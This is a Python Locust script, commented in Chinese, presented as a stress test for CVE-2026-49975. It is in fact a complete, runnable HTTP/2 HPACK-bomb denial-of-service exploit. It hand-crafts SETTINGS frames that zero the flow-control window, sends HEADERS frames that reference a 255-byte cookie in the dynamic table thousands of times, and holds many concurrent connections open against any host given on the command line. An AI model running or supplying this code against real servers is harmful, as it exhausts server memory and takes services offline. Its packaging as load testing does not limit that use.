#!/usr/bin/env python3
"""
CVE-2026-49975 专用压测脚本
============================
所有并发用户都执行 HTTP/2 HPACK 炸弹攻击，
通过 -u 参数控制并发线程数，测试不同并发下的内存消耗。

使用方法：
  # 100 个并发线程，跑 5 分钟
  locust -f locustfile.py --host https://your-target.com \
    --headless -u 100 -r 100 --run-time 5m

  # 500 个并发线程，跑 10 分钟
  locust -f locustfile.py --host https://your-target.com \
    --headless -u 500 -r 500 --run-time 10m

环境变量控制：
  LOCUST_REFERENCES    : 每个流的 HPACK 引用次数 (默认 2048)
  LOCUST_HOLD_SECONDS  : 每个炸弹连接保持秒数 (默认 15)
  LOCUST_STREAMS       : 每个连接的并发流数 (默认 1)
"""

from locust import User, task, constant, events
import socket
import ssl
import struct
import time
import logging
import os

logger = logging.getLogger(__name__)

# ============================================================
# 环境变量配置
# ============================================================

REFERENCES = int(os.environ.get("LOCUST_REFERENCES", "2048"))
HOLD_SECONDS = int(os.environ.get("LOCUST_HOLD_SECONDS", "15"))
STREAMS = int(os.environ.get("LOCUST_STREAMS", "1"))

# ============================================================
# HTTP/2 帧构建
# ============================================================

CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS_FRAME_TYPE = 0x04
HEADERS_FRAME_TYPE = 0x01


def build_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    length = len(payload)
    return (
        struct.pack(">I", length)[1:]
        + struct.pack("BB", frame_type, flags)
        + struct.pack(">I", stream_id & 0x7FFFFFFF)
        + payload
    )


def build_settings(initial_window_size: int = 0, max_frame_size: int = 16384) -> bytes:
    """SETTINGS 帧：关闭流量控制窗口 (INITIAL_WINDOW_SIZE=0)"""
    payload = struct.pack(">HI", 0x04, initial_window_size) + struct.pack(
        ">HI", 0x05, max_frame_size
    )
    return build_frame(SETTINGS_FRAME_TYPE, 0x00, 0, payload)


def build_headers_frame(stream_id: int, indexed_references: int = 2048) -> bytes:
    """
    HPACK 炸弹 HEADERS 帧：
    1. 向动态表插入 255 字节的 cookie header
    2. 重复引用同一动态表索引（0xBE = 索引 62），放大服务端内存分配
    """
    name = b"cookie"
    value = b"a" * 255
    insert_prefix = bytes([0x40, len(name)]) + name + bytes([len(value)]) + value
    indexed_ref = bytes([0xBE])
    payload = insert_prefix + indexed_ref * indexed_references
    return build_frame(HEADERS_FRAME_TYPE, 0x04 | 0x01, stream_id, payload)


# ============================================================
# 用户类：CVE-2026-49975 HTTP/2 HPACK 炸弹
# ============================================================

class Http2BombUser(User):
    """
    每个用户 = 一个 HTTP/2 HPACK 炸弹攻击线程
    持续建立连接 → 发送炸弹 payload → 保持连接不释放
    """

    wait_time = constant(0)

    references_per_stream = REFERENCES
    streams_per_connection = STREAMS
    hold_seconds = HOLD_SECONDS

    _ssl_ctx = None

    @classmethod
    def _get_ssl_ctx(cls):
        if cls._ssl_ctx is None:
            ctx = ssl.create_default_context()
            ctx.set_alpn_protocols(["h2"])
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            cls._ssl_ctx = ctx
        return cls._ssl_ctx

    def _parse_host(self):
        """从 self.host 解析主机名、端口、是否 TLS"""
        host = self.host or "https://127.0.0.1"

        if host.startswith("https://"):
            rest = host[8:]
            default_port = 443
            use_tls = True
        elif host.startswith("http://"):
            rest = host[7:]
            default_port = 80
            use_tls = False
        else:
            rest = host
            default_port = 443
            use_tls = True

        if ":" in rest:
            hostname, port_str = rest.split(":", 1)
            port = int(port_str.split("/")[0])
        else:
            hostname = rest.split("/")[0]
            port = default_port

        return hostname, port, use_tls

    @task
    def http2_bomb_attack(self):
        """
        执行一次 HTTP/2 HPACK 炸弹攻击，并手动上报统计。
        """
        hostname, port, use_tls = self._parse_host()
        sock = None
        start_time = time.time()
        request_meta = {
            "request_type": "H2-BOMB",
            "name": f"/ (refs={self.references_per_stream}, hold={self.hold_seconds}s)",
            "start_time": start_time,
            "response_length": 0,
            "response": None,
            "context": {},
            "exception": None,
        }

        try:
            # ---- 1. TCP 连接 ----
            sock = socket.create_connection((hostname, port), timeout=10.0)

            # ---- 2. TLS 握手 ----
            if use_tls:
                sock = self._get_ssl_ctx().wrap_socket(sock, server_hostname=hostname)

            # ---- 3. 发送 HTTP/2 前言 + SETTINGS ----
            sock.sendall(CLIENT_PREFACE)
            sock.sendall(build_settings(initial_window_size=0))

            # ---- 4. 发送 HPACK 炸弹 HEADERS 帧 ----
            for sid in range(1, 2 * self.streams_per_connection, 2):
                frame = build_headers_frame(sid, self.references_per_stream)
                sock.sendall(frame)

            # ---- 5. 保持连接存活 ----
            if self.hold_seconds > 0:
                end_time = time.time() + self.hold_seconds
                while time.time() < end_time:
                    try:
                        sock.settimeout(1.0)
                        data = sock.recv(4096)
                        if not data:
                            break
                    except socket.timeout:
                        continue
                    except OSError:
                        break

            # 成功
            request_meta["response_length"] = 0
            request_meta["response"] = None

        except Exception as e:
            request_meta["exception"] = e

        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

            # ===== 手动上报请求统计到 Locust =====
            total_time = int((time.time() - start_time) * 1000)
            request_meta["response_time"] = total_time

            if request_meta["exception"]:
                # 上报失败
                events.request_failure.fire(**request_meta)
            else:
                # 上报成功
                events.request_success.fire(**request_meta)


# ============================================================
# 启动时输出配置信息
# ============================================================

@events.test_start.add_listener
def on_test_start(environment, **kw):
    logger.info("=" * 60)
    logger.info("  CVE-2026-49975 HTTP/2 HPACK 炸弹压测")
    logger.info(f"  并发用户数 (-u)    : {environment.runner.target_user_count}")
    logger.info(f"  HPACK 引用次数     : {REFERENCES}")
    logger.info(f"  连接保持秒数       : {HOLD_SECONDS}")
    logger.info(f"  每连接流数         : {STREAMS}")
    logger.info(f"  目标地址           : {environment.host}")
    logger.info(f"  测试时长           : {environment.runner.run_time}秒")
    logger.info("=" * 60)
    logger.info("  观察目标服务器内存:")
    logger.info("  $ watch -n 2 'ps aux | grep nginx | grep -v grep'")
    logger.info("=" * 60)